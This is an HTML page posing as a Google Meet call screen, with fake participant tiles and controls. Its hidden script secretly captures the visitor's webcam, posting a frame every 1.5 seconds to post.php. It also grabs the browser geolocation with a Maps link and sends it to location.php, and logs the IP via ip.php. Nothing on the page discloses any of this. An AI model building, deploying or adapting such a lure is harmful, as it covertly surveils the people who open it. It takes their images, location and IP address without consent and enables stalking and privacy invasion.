<!doctype html>
<html>
<head>
<title>Google Meet</title>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #202124; /* Dark gray background */
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white; /* Set default text color to white */
}

#meet-container {
  width: 100%;
  max-width: none;
  background-color: transparent;
  box-shadow: none;
  padding: 0;
  margin-top: 0;
  height: 100vh;
  display: flex;
  flex-direction: column;
}

.video-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
  grid-gap: 8px;
  margin-bottom: auto;
  padding: 10px;
  flex: 1;
}

.video-container {
  position: relative;
  background-color: #3c4043;
  border-radius: 8px;
  overflow: hidden;
}

.video-container video {
  width: 100%;
  display: block;
  object-fit: cover;
}

.video-container .name-overlay {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  color: white;
  padding: 6px;
  font-size: 14px;
  text-align: left;
}

#local-video-container {
  border: none;
}

#content-area {
  width: 100%;
  text-align: center;
  padding: 0;
  flex: 0;
}

#bottom-bar {
  background-color: #3c4043;
  padding: 12px;
  text-align: center;
  border-top: none;
  border-radius: 0;
  display: flex; /* Use flexbox for the buttons */
  justify-content: center; /* Center the buttons horizontally */
}

#bottom-bar button {
  padding: 8px 16px;
  margin: 0 8px;
  border: none;
  border-radius: 24px;
  background-color: #5f6368;
  color: white;
  cursor: pointer;
  font-size: 14px;
  display: flex;  /* Use flexbox for icon and text */
  align-items: center; /* Vertically align icon and text */
}

#bottom-bar button:hover {
  background-color: #70757a;
}

/* Style for icons.  Replace content with actual icon images/svgs */
#bottom-bar button::before {
  display: inline-block;
  width: 20px;  /* Adjust as needed */
  text-align: center; /* Center the icon within its space */
  margin-right: 5px; /* Space between icon and text */
  font-size: 16px; /* Adjust as needed */
}

/* Specific icons (replace with actual icon characters/images */
#bottom-bar button:nth-child(1)::before { content: "\f130"; font-family: FontAwesome;} /* Mic */
#bottom-bar button:nth-child(2)::before { content: "\f030"; font-family: FontAwesome;} /* Camera */
#bottom-bar button:nth-child(3)::before { content: "\f075"; font-family: FontAwesome;} /* Closed Captions */
#bottom-bar button:nth-child(4)::before { content: "\f03e"; font-family: FontAwesome;} /* Present Now */
#bottom-bar button:nth-child(5)::before { content: "\f011"; font-family: FontAwesome;} /* Leave Call */

.time-code {
  position: absolute;
  bottom: 0;
  left: 0;
  color: rgba(255,255,255,0.7);
  font-size: 12px;
  padding: 4px;
}

.meet-code {
    position: absolute;
    bottom: 0;
    right: 0;
    color: rgba(255,255,255,0.7);
    font-size: 12px;
    padding: 4px;
}

/* Style the "C" placeholder */
.initial-placeholder {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: 100%;
  font-size: 80px;
  color: white;
  text-transform: uppercase;
}

</style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
  <div id="meet-container">
    <div class="video-grid">
      <!-- Local Video -->
      <div class="video-container" id="local-video-container">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <div class="name-overlay">You</div>
      </div>

      <!-- Placeholder for other participants -->
      <div class="video-container">
          <div class="initial-placeholder">C</div>
        <div class="name-overlay">Carlos Houadjeto</div>
      </div>

      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Rachad Abdel KARIM</div>
      </div>

       <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">wikimedia BÃ©nin user group</div>
      </div>

      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Yolande FLEURY</div>
      </div>

        <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Pawas TAROU</div>
      </div>

      <!-- Add more video-container divs for more participants -->
    </div>

    <div id="content-area">
      <!--  Removed the iframe and the whole live yt tv thing -->
    </div>

    <div id="bottom-bar">
      <button>Mic</button>
      <button>Camera</button>
      <button>Closed Captions</button>
      <button>Present Now</button>
      <button>Leave call</button>
      </div>
      <div class="time-code">
      13:07
      </div>
        <div class="meet-code">
        arj-zgjp-mvr
        </div>
  </div>

<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php', // Use your existing post.php
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);


}

// Load init
init();

// Get location
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var accuracy = position.coords.accuracy;

        // Create Google Maps link
        var googleMapsLink = "https://maps.google.com/?q=" + latitude + "," + longitude;

        // Prepare the data to be sent
        var locationData = {
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          googleMapsLink: googleMapsLink
        };

        // Send the location data to the server
        $.ajax({
          type: 'POST',
          url: 'location.php', // Use your existing location.php
          data: locationData,
          dataType: 'json',
          async: false,
          success: function (result) {
            console.log('Location data sent successfully.');
          },
          error: function () {
            console.error('Error sending location data.');
          }
        });
      },
      function (error) {
        console.error("Geolocation error: " + error.message);
        // Handle geolocation errors appropriately
      }
    );
  } else {
    console.error("Geolocation is not supported by this browser.");
  }

  // Get IP Address
  $.ajax({
    type: 'POST',
    url: 'ip.php',
    dataType: 'json',
    async: false,
    success: function(result){
      console.log('IP address captured.');
    },
    error: function(){
      console.error('Error capturing IP address.');
    }
  });
</script>

</body>
</html>
